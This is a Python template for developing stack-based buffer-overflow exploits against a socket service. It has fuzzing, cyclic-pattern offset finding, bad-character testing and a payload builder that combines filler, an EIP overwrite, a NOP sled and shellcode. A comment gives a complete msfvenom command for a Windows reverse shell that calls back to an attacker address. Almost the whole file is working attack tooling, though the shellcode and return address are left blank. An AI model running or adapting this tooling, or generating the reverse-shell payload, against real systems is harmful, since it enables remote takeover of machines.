#!/usr/bin/python

# This is a Python based template to be used in
# developing stack based buffer-overflow explitation
import socket
import traceback
import struct
import sys

# Interaction type to use
EXPLOIT_TYPE_INTERACTIVE = 1
EXPLOIT_TYPE_DETECT_TIMEOUT = 2
EXPLOIT_TYPE_INJECT_PATTERN = 2

EXPLOIT_TYPE_DETECT_TIMEOUT_MIN_BUFFER_SIZE = 1
EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE = 1024 * 5

# Deliver channel to use
CHANNEL_TYPE_SOCKET = 1
CHANNEL_TYPE_HTTP = 2

socket_timeout = 3.0
socket_recv_buffer = 1024

exploitType = 1
target_host = "localhost"
target_port = 31337
wait_for_response = True
debug = True

payload_prefix = ""
payload_suffix = "\n"

STATUS_SUCCESS = "success"
STATUS_TIMEOUT = "timeout"
STATUS_ERROR = "error"

#####################
# Utility functions #
#####################

# From: https://github.com/ickerwx/pattern/blob/master/pattern


def pattern_create(length=8192):
    pattern = ''
    parts = ['A', 'a', '0']
    try:
        if not isinstance(length, (int)) and length.startswith('0x'):
            length = int(length, 16)
        elif not isinstance(length, (int)):
            length = int(length, 10)
    except ValueError:
        sys.exit(254)
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

# From: https://github.com/ickerwx/pattern/blob/master/pattern


def pattern_offset(value, length=8192):
    try:
        if not isinstance(value, (int)) and value.startswith('0x'):
            value = struct.pack('<I', int(value, 16)).strip('\x00')
    except ValueError:
        sys.exit(254)
    pattern = pattern_create(length)
    try:
        return pattern.index(value)
    except ValueError:
        return 'Not found'

#####################
# Channel Functions #
#####################


def send_socket(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_host, target_port))
    s.send(payload)
    if wait_for_response:
        s.settimeout(socket_timeout)
        response = s.recv(socket_recv_buffer)
        print("[<] Rsp: " + str(response))
    s.close()


def build_final_payload(user_input):
    payload = payload_prefix + user_input + payload_suffix
    return payload


def build_filler_payload(splits):
    payload = ""
    charCode = 65
    for split in splits:
        payload = payload + (chr(charCode) * int(split))
        charCode = charCode + 1
    return payload


def send_payload(payload):
    try:
        print("")

        payload = build_final_payload(payload).encode()
        print("[>] Req: " + str(payload))
        send_socket(payload)
        print("[*] Done")
        return STATUS_SUCCESS
    except socket.timeout:
        print("[!] Timeout")
        return STATUS_TIMEOUT
    except Exception as e:
        print("[!] Error ", str(e))
        traceback.print_exc()
        return STATUS_ERROR

#####################
# Exploit Functions #
#####################


def interactive():
    while True:
        print("")
        user_input = input("INPUT ('py:' for python expr, 'exit:' to stop) > ")
        if (user_input.startswith("exit:")):
            break
        if (user_input.startswith("py:")):
            user_input = eval(user_input[3:])
        send_payload(user_input)


def detect_timeout():
    for i in range(EXPLOIT_TYPE_DETECT_TIMEOUT_MIN_BUFFER_SIZE, EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE):
        status = send_payload(i)
        if (status == STATUS_TIMEOUT or status == STATUS_ERROR):
            break

def exploit():
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x 86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
    shellcode = ("")

    filler = "A" * 780
    eip = "\x01\x01\x01\x01" 
    offset = "C" * 4

    buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
    inputBuffer = filler + eip + offset + buffer

    nops = "\x90" * 10
    inputBuffer = filler + eip + offset + nops + shellcode

    send_payload(inputBuffer)

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


def main():
    print_header = True
    while True:
        if print_header:
            print("")
            print("1 - interactive")
            print("2 - detect_timeout")
            print("3 - pattern_create")
            print("4 - pattern_offset")
            print("5 - pattern_send")
            print("6 - send_filler_chars")
            print("7 - find_bad_chars")
            print("8 - reverse_shell")
            print("9 - exploit")

        option = input("Option > ")
        print_header = True
        if (option == "1"):
            interactive()
        elif (option == "2"):
            detect_timeout()
        elif (option.startswith("3")):
            try:
                print(pattern_create(option.split(" ")[1]))
            except IndexError:
                print("Provide length along with the option (Example: '3 1024')")
            print_header = False
        elif (option.startswith("4")):
            try:
                value = option.split(" ")[2]
                if (len(value) > 4):
                    value = bytearray.fromhex(value.strip()).decode()[::-1]
                    print("Finding: " + value)
                offset = pattern_offset(value, option.split(" ")[1])
                print(offset)
            except IndexError:
                print(
                    "Provide length and value to search along with the option (Example: '4 1024 Aa0A')")
            print_header = False
        elif (option.startswith("5")):
            try:
                send_payload(pattern_create(option.split(" ")[1]))
            except IndexError:
                print("Provide length along with the option (Example: '5 1024')")
                print_header = False
        elif (option.startswith("6")):
            payload = build_filler_payload(option.split(" ")[1:])
            send_payload(payload)
        elif (option.startswith("7")):
            filler_splits = option.split(" - ")[0].split(" ")[1:]
            barchar_splits = option.split(" - ")[1].split(" ")
            new_badchars = badchars
            for barchar_split in barchar_splits:
                char = chr(int(barchar_split,16))
                print("Removing " + ascii(char))
                new_badchars = new_badchars.replace(char, "")
            payload = build_filler_payload(filler_splits) + new_badchars
            send_payload(payload)
        else:
            print("[!] Unknown option")


main()
